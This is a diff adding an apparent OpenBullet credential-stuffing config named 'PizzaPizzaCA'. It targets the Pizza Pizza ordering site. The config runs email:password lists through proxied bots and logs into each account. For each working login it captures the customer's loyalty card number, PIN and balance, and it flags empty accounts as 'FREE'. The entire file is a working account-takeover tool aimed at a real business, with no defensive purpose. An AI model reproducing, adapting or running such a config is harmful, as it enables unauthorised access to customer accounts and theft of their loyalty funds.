@@ -1,0 +1,80 @@
+[SETTINGS]
+{
+  "Name": "PizzaPizzaCA",
+  "SuggestedBots": 50,
+  "LastModified": "2018-07-10T23:46:33.403577+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUEST_STUFF REQUEST GET "https://order.pizzapizza.ca/PhoenixWEB/order/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_TOKEN PARSE "<SOURCE>" LR "var x_token = \"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#REQUEST_LOGIN REQUEST POST "https://order.pizzapizza.ca/PhoenixWEB/order/ajax.php?processid=353" AutoRedirect=TRUE 
+  CONTENT "authUserId=<USER>&authPassword=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Auth-Token: <TOKEN>" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://order.pizzapizza.ca/PhoenixWEB/order/" 
+  HEADER "Origin: https://order.pizzapizza.ca" 
+#CHECK_FAIL KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "\"000\"" 
+  KEYCHAIN Failure OR 
+    KEY "\"010\"" 
+#PARSE_CUSTOMER_ID PARSE "<SOURCE>" LR "customerID\":\"" "\"" Recursive=FALSE -> VAR "CID" "" "" 
+#REQUEST_DETAILS REQUEST POST "https://order.pizzapizza.ca/PhoenixWEB/order/ajax.php?processid=73" AutoRedirect=TRUE 
+  CONTENT "customerID=<CID>&searchCustomerDBCustomerID=<CID>&customerEmail=<USER>&action=get" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Auth-Token: <TOKEN>" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://order.pizzapizza.ca/PhoenixWEB/order/" 
+  HEADER "Origin: https://order.pizzapizza.ca" 
+#PARSE_POINTSCARD PARSE "<SOURCE>" JSON "loyaltyCardNumber" Recursive=FALSE -> CAP "CARDNUMBER" "" "" 
+#PARSE_PIN PARSE "<SOURCE>" JSON "loyaltyCardPIN" Recursive=FALSE -> CAP "PIN" "" "" 
+#SACRIFICIAL_BLOCK PARSE "<SOURCE>" JSON "loyaltyCardNumber" Recursive=FALSE -> VAR "CARDNUMBER" "" "" 
+#CHECK_FREE KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<CARDNUMBER>" EqualTo "" 
+#REQUEST_INFO REQUEST POST "https://order.pizzapizza.ca/PhoenixWEB/order/ajax.php?processid=18" AutoRedirect=TRUE 
+  CONTENT "processid=18&loyCardNumber=<CARDNUMBER>&loyVersion=2" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Auth-Token: <TOKEN>" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://order.pizzapizza.ca/PhoenixWEB/order/" 
+  HEADER "Origin: https://order.pizzapizza.ca" 
+#PARSE_BALANCE PARSE "<SOURCE>" JSON "loyLoyBalance" Recursive=FALSE -> CAP "BALANCE" "$" "" 
+#SACRIFICIAL_BLOCK PARSE "<SOURCE>" JSON "loyLoyBalance" Recursive=FALSE -> VAR "BALANCE" "" "" 
+#CHECK_FREE KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<BALANCE>" EqualTo "0.00" 
+    KEY "<BALANCE>" EqualTo "" 
